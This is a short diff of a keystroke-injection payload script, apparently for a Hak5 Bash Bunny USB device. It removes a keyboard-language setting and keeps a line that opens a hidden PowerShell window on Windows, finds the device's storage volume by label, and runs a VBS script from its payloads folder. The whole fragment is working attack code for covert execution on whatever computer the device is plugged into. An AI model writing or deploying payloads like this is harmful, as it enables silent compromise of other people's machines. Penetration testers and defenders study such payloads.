@@ -21,8 +21,6 @@ LED R
 #We are a keyboard
 ATTACKMODE HID STORAGE
 
-#Set keyboard language
-DUCKY_LANG us
 
 QUACK DELAY 500
 RUN WIN powershell -windowstyle hidden ".((gwmi win32_volume -f 'label=''$DRIVER_LABEL''').Name+'payloads\\$SWITCH_POSITION\a.vbs')"
